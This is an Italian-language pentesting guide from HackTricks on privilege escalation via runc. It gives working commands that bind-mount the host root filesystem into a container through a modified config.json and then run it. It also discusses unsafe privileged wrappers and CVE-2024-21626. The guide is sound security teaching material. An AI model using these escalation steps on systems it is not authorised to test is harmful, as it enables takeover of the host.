# RunC Escalatione dei privilegi

{{#include ../../banners/hacktricks-training.md}}

## Informazioni di base

Se vuoi saperne di più su **runc**, consulta la seguente pagina:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Se `runc` è disponibile per un processo rootful sull'host, puoi usare un OCI bundle la cui configurazione dei mount esegue ricorsivamente il bind-mount di `/` dell'host su `/` all'interno del container, esponendo il filesystem dell'host in quel mount namespace.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```

> [!CAUTION]
> Il workflow documentato `runc run` è rootful: gli esempi di runc lo definiscono «run as root». Un utente non privilegiato ha bisogno di una configurazione rootless, come `runc spec --rootless`; runc documenta inoltre che per questa modalità è necessario abilitare gli user namespace.<sup>[[1]](#references)</sup>

## Wrapper privilegiati e versioni del runtime

Un wrapper privilegiato che accetta un bundle OCI controllato dal chiamante può esporre file dell’host se consente bind mount non sicuri. Verifica se il wrapper risolve i percorsi di traversal e i symlink prima di convalidare le origini e le destinazioni dei mount e se limita `process.cwd`. Una regola sudo o un `config.json` scrivibile, da soli, non dimostrano che il wrapper accetterà il bundle o lo eseguirà con i privilegi dell’host.

Separatamente, [CVE-2024-21626](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv) ha interessato le versioni upstream di `runc` dalla `1.0.0-rc93` alla `1.1.11`; la `1.1.12` include la correzione upstream. File descriptor leaked e una convalida insufficiente della directory di lavoro potevano collocare un processo del container al di fuori della sua root durante determinati workflow `runc run` o `runc exec`. I numeri dei file descriptor dipendono dall’invocazione e la stringa della versione non dimostra che la vulnerabilità sia sfruttabile se un vendor ha retroportato le correzioni o il chiamante non può influenzare un’invocazione privilegiata del runtime.

## References

- [1] [runc: strumento CLI per avviare ed eseguire container](https://github.com/opencontainers/runc#using-runc)
- [2] [Specifica OCI Runtime: Mount](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Sottoalberi condivisi](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
